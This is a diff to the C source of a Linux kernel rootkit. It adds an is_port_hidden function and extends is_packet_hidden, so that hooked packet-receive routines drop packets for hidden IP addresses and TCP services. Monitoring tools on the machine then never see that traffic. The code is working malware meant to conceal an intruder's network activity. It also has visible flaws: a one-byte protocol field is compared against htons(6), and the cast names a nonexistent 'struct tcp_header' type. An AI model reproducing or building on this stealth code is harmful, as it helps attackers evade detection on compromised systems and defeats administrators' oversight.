@@ -34,22 +34,61 @@ char original_tpacket_rcv[6];
 char original_packet_rcv_spkt[6];
 
 /*
- * check if we need to hide this particular packet
+ * checks if this specific tcp service is hidden.
+ */
+int
+is_port_hidden (struct sk_buff *skb)
+{
+	struct iphdr *ip_header;
+	struct tcphdr *tcp_header;
+	
+	/* check if this frame contains an IP packet */
+	if (skb->protocol == htons(ETH_P_IP)) {
+		ip_header = (struct iphdr *) skb_network_header(skb);
+		
+		/* check if this is an TCP packet */
+		if (ip_header->protocol == htons(6)) {
+			tcp_header = (struct tcp_header *) skb_transport_header(skb);
+			
+			/* check with the control API if this service is hidden */
+			if (is_service_hidden(tcp_header->source)
+					|| is_service_hidden(tcp_header->dest)) {
+				
+				ROOTKIT_DEBUG("Filtered service.\n");
+				
+				return 1;
+			}
+		}
+		
+	}
+
+	return 0;
+}
+
+/*
+ * check if we need to hide this particular packet.
  */
 int
 is_packet_hidden (struct sk_buff *skb)
 {
+	struct iphdr *ip_header;
+	
+	/* check if this frame contains an IP packet */
 	if (skb->protocol == htons(ETH_P_IP)) {
-		struct iphdr* iphdr = (struct iphdr*) skb_network_header(skb);
+		ip_header = (struct iphdr *) skb_network_header(skb);
 
-		if (is_ip_hidden(iphdr->saddr)
-				|| is_ip_hidden(iphdr->daddr)) {
+		/* check if we have to filter this IP address */
+		if (is_ip_hidden(ip_header->saddr)
+				|| is_ip_hidden(ip_header->daddr)) {
+				
+			ROOTKIT_DEBUG("Filtered IP address.\n");
 			
 			return 1;
 		}
 	}
 	
-	return 0;
+	/* check if this is a filtered service */
+	return is_port_hidden(skb);
 }
 
 /* hooks 'packet_rcv' */
